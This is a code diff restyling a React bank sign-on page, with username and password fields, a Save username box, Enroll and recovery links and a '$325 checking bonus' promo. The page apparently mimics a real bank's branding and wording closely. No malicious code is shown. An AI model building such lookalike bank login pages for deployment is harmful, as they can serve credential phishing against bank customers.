@@ -192,127 +192,98 @@ export default function LoginPage() {
       </div>
 
       {/* Main content area with login form and promo */}
-      <section className="bg-white border-b border-gray-200">
-        <div className="max-w-7xl mx-auto px-6 py-8 flex gap-12">
-          {/* Left side - Sign On Form */}
-          <div className="w-[280px] flex-shrink-0">
-            <h2 className="text-xl text-gray-800 mb-1" style={{ fontFamily: "Georgia, serif" }}>
+      <section className="bg-[#f5f0eb] border-b border-gray-200">
+        <div className="max-w-7xl mx-auto px-6 py-10 flex gap-16">
+          {/* Left side - Sign On Form Card */}
+          <div className="w-[260px] flex-shrink-0 bg-white rounded-lg shadow-lg p-6">
+            <h2 className="text-xl text-gray-900 mb-1" style={{ fontFamily: "Georgia, serif" }}>
               {greeting}
             </h2>
-            <p className="text-sm text-gray-600 mb-4">Sign on to manage your accounts.</p>
+            <p className="text-sm text-gray-500 mb-5">Sign on to manage your accounts.</p>
 
-            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-3">
+            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
               <div>
-                <label className="text-xs text-gray-600 block mb-1">Username</label>
                 <input
                   {...form.register("username")}
+                  placeholder="Username"
                   autoComplete="username"
                   autoCapitalize="off"
                   autoCorrect="off"
                   spellCheck={false}
-                  className="flex h-10 w-full px-3 text-sm border border-gray-300 rounded focus:border-[#d71e28] focus:outline-none focus:ring-1 focus:ring-[#d71e28] bg-white"
+                  className="w-full h-11 px-3 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
                   data-testid="desktop-input-username"
                 />
               </div>
 
-              <div>
-                <div className="flex justify-between items-center mb-1">
-                  <label className="text-xs text-gray-600">Password</label>
-                  <button
-                    type="button"
-                    onMouseDown={(e) => e.preventDefault()}
-                    onClick={() => setShowPassword(!showPassword)}
-                    className="text-[#0066b2] text-xs hover:underline"
-                  >
-                    {showPassword ? "Hide" : "Show"}
-                  </button>
-                </div>
+              <div className="relative">
                 <input
                   {...form.register("password")}
                   type={showPassword ? "text" : "password"}
+                  placeholder="Password"
                   autoComplete="current-password"
-                  className="flex h-10 w-full px-3 text-sm border border-gray-300 rounded focus:border-[#d71e28] focus:outline-none focus:ring-1 focus:ring-[#d71e28] bg-white"
+                  className="w-full h-11 px-3 pr-12 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
                   data-testid="desktop-input-password"
                 />
+                <button
+                  type="button"
+                  onMouseDown={(e) => e.preventDefault()}
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="absolute right-0 top-1/2 -translate-y-1/2 text-[#0066b2] text-sm hover:underline"
+                >
+                  {showPassword ? "Hide" : "Show"}
+                </button>
               </div>
 
-              <div className="flex items-center gap-2">
-                <input type="checkbox" id="saveUsername" className="w-4 h-4 accent-[#d71e28]" />
-                <label htmlFor="saveUsername" className="text-xs text-gray-600">Save username</label>
+              <div className="flex items-center gap-2 pt-1">
+                <input type="checkbox" id="saveUsername" className="w-4 h-4 border-gray-300 rounded" />
+                <label htmlFor="saveUsername" className="text-sm text-gray-600">Save username</label>
               </div>
 
-              <div className="flex gap-2 pt-1">
+              <div className="flex items-center gap-3 pt-2">
                 <Button
                   type="submit"
-                  className="flex-1 h-9 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded text-sm"
+                  className="h-10 px-8 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded-full text-sm"
                   disabled={loginMutation.isPending}
                   data-testid="desktop-button-sign-on"
                 >
                   {loginMutation.isPending ? "..." : "Sign On"}
                 </Button>
-                <Link href="/register">
-                  <Button
-                    type="button"
-                    variant="outline"
-                    className="h-9 px-4 border-gray-400 text-gray-700 font-semibold rounded text-sm hover:bg-gray-50"
-                  >
-                    Enroll
-                  </Button>
+                <Link href="/register" className="text-gray-600 hover:text-gray-800 text-sm font-medium">
+                  Enroll
                 </Link>
               </div>
             </form>
 
-            <div className="mt-3 pt-3 border-t border-gray-200">
-              <Button
-                type="button"
-                variant="outline"
-                className="w-full h-9 rounded border border-gray-400 text-gray-700 font-medium text-xs hover:bg-gray-50"
-                onClick={handleBiometricLogin}
-                disabled={biometricLoading}
-                data-testid="desktop-button-passkey"
-              >
-                <User className="w-4 h-4 mr-2" />
-                {biometricLoading ? "Verifying..." : "Use Face ID or passkey"}
-              </Button>
-            </div>
-
-            <div className="mt-3 space-y-1 text-xs">
-              <Link href="/forgot-password" className="text-[#0066b2] hover:underline block">
+            <div className="mt-5 space-y-1 text-sm">
+              <Link href="/forgot-password" className="text-gray-600 hover:text-[#d71e28] block">
                 Forgot username or password?
               </Link>
-              <Link href="/security" className="text-[#0066b2] hover:underline block">
+              <Link href="/security" className="text-gray-600 hover:text-[#d71e28] block">
                 Security Center
               </Link>
-              <span className="text-[#0066b2] hover:underline cursor-pointer block">
+              <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer block">
                 Privacy, Cookies, and Legal
               </span>
             </div>
           </div>
 
-          {/* Right side - Promotional content */}
-          <div className="flex-1 flex gap-8">
-            {/* Main promo */}
-            <div className="flex-1">
-              <div className="flex items-start gap-6">
-                <div className="flex-1">
-                  <h1 className="text-3xl text-gray-800 font-light mb-3" style={{ fontFamily: "Georgia, serif" }}>
-                    $325 checking bonus on us
-                  </h1>
-                  <p className="text-sm text-gray-600 mb-4 leading-relaxed">
-                    New customers open an eligible checking account with qualifying direct deposits.
-                  </p>
-                  <button className="bg-[#1a1a1a] text-white px-5 py-2 rounded text-sm font-semibold hover:bg-black transition-colors">
-                    Get started
-                  </button>
-                </div>
-                <div className="w-48 h-32 bg-gradient-to-br from-pink-100 to-pink-200 rounded-lg flex items-center justify-center overflow-hidden">
-                  <div className="text-center">
-                    <div className="text-xs text-gray-500">Enjoy</div>
-                    <div className="text-4xl font-bold text-[#d71e28]">$325</div>
-                  </div>
-                </div>
-              </div>
-            </div>
+          {/* Center - Promotional content */}
+          <div className="flex-1 pt-8">
+            <h1 className="text-4xl text-gray-800 font-light mb-4 leading-tight" style={{ fontFamily: "Georgia, serif" }}>
+              $325 checking bonus on us
+            </h1>
+            <p className="text-base text-gray-600 mb-6 leading-relaxed max-w-md">
+              New customers open an eligible checking account with qualifying direct deposits
+            </p>
+            <button className="border-2 border-gray-800 text-gray-800 px-6 py-2.5 rounded-full text-sm font-semibold hover:bg-gray-800 hover:text-white transition-colors">
+              Get started &gt;&gt;
+            </button>
+          </div>
+
+          {/* Right side - Enjoy $325 */}
+          <div className="flex-shrink-0 pt-8 text-right">
+            <p className="text-sm text-[#9b2d83] mb-1">Enjoy</p>
+            <p className="text-6xl font-light text-[#9b2d83]" style={{ fontFamily: "Georgia, serif" }}>$325</p>
           </div>
         </div>
       </section>
